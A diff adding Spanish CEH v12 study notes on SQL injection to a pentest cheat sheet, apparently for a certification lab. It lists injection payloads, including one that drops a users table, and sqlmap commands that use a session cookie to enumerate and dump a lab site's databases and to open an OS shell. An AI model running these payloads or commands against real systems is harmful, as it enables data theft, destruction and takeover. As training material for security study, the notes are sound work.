@@ -569,6 +569,144 @@ curl http://target.com/?feed=rss2 | grep -i creator
     |  - Id: 1
     |  - Login: admin
 ```
+###SQL Injection
+# Apuntes CEH v12: SQL Injection
+
+## 1. SQL Injection en Base de Datos MSSQL
+
+### Payloads Básicos para Detectar Inyección
+```sql
+'OR 1=1 --
+```
+
+### Operaciones en Base de Datos
+```sql
+-- Agregar una entrada nueva
+Admin'; Insert into login values('john','apple123');--
+
+-- Eliminar tabla completa
+blah'; DROP TABLE users; --
+```
+
+---
+
+## 2. Extracción de Base de Datos MSSQL con SQLMap
+
+### Proceso Manual de Preparación
+
+**Paso 1: Acceso inicial**
+- Navegar a: `http://www.moviescope.com/`
+- Credenciales de login: **Usuario:** `sam` **Contraseña:** `test`
+- Hacer clic en **Login**
+
+**Paso 2: Obtener cookie de sesión**
+- Una vez logueado, ir a **View Profile**
+- Anotar la URL completa en la barra de direcciones
+- Hacer clic derecho → **Inspect (Q)**
+- En **Developer Tools** → pestaña **Console**
+- Ejecutar comando para obtener cookie:
+```javascript
+document.cookie
+```
+- Copiar el valor de la cookie obtenida
+
+**Paso 3: Preparar terminal**
+```bash
+sudo su
+# Contraseña: toor
+```
+
+### Comandos SQLMap para Extracción
+
+**Enumerar bases de datos:**
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=" --dbs
+```
+
+**Enumerar tablas de una base de datos específica:**
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope --tables
+```
+
+**Extraer datos de tabla específica:**
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
+```
+
+**Obtener shell del sistema:**
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
+```
+
+**Comandos útiles en shell:**
+```bash
+TASKLIST
+help
+```
+
+---
+
+## 3. Comandos MySQL
+
+### Conexión a Base de Datos MySQL
+```bash
+mysql -u qdpmadmin -h 192.168.1.8 -p password
+```
+
+### Comandos Básicos MySQL
+```sql
+-- Ver todas las bases de datos
+show databases;
+
+-- Seleccionar base de datos específica
+use qdpm;
+
+-- Ver todas las tablas
+show tables;
+
+-- Consultar datos de tabla específica
+select * from users;
+
+-- Cambiar a otra base de datos
+use staff;
+
+-- Ver tablas de la nueva BD
+show tables;
+
+-- Consultar tablas específicas
+select * from login;
+select * from user;
+```
+
+---
+
+## 4. Herramientas Adicionales para SQL Injection
+
+### Alternativas a SQLMap:
+- **Mole** - https://sourceforge.net
+- **jSQL Injection** - https://github.com
+- **NoSQLMap** - https://github.com  
+- **Havij** - https://github.com
+- **blind_sql_bitshifting** - https://github.com
+
+---
+
+## Notas Importantes
+
+### Consideraciones de Seguridad:
+- Siempre usar estas técnicas solo en entornos autorizados
+- Documentar todos los hallazgos encontrados
+- Las cookies de sesión son críticas para mantener la autenticación
+
+### Tips Prácticos:
+- Anotar siempre la URL completa cuando se encuentra una vulnerabilidad
+- Las cookies deben copiarse exactamente como aparecen
+- Usar `sudo su` para permisos de root cuando sea necesario
+- El parámetro `--os-shell` en SQLMap puede proporcionar acceso completo al sistema
+
+---
+
+> Última actualización: 15 sept 2025
 
 ### SQLMAP
 **Objetivo:** Detección y explotación de SQL injection.
